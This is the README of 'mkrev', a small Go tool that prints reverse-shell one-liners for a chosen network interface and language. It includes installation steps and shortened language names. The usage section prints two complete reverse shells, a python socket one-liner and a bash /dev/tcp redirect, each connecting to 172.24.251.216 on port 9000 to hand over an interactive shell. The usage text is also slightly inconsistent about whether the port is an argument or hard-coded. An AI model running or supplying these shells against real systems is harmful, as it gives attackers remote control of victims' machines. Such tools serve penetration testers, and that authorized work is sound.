# Mkrev

A lazy tool to generate reverse shell, it's quicker than browsing a cheatsheet, less typing as well !

> You don't have to type the IP! All hail laziness!

## Installation

```
$ git clone https://github.com/fahmifj/mkrev.git
$ cd mkrev
$ go build -o mkrev main.go
```
> You can make the binary name even shorter, like `rs`, `grs`

For easy call, put the binary (mkrev) inside your `$HOME/bin` then append it to your $PATH variable.
```
$ export $PATH=$HOME/bin:$PATH`
```
## Usage and examples

Usage is simple where some languages (Shell options) use shorter names.

```
$ mkrev [interface] [port] [shell]
```
> Port is hard-coded to 9000.

- **interface**, an interface name like eth0, enp0s3, tun0, etc.
- **shell**, the scripting languages/utility name to generate the reverse shell code

Shortened language names:
- `py` for python
- `nc` for netcat
- `ps` for powershell
- `pl` for perl
- `rb` for ruby

Example usage

- Generate a python reverse shell

        ```
        $ mkrev eth0 py
        python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.24.251.216",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
        ```

- Generate a bash reverse shell
        ```
        $ mkrev eth0 bash
    bash -c "bash -i >& /dev/tcp/172.24.251.216/9000 0>&1
        ```%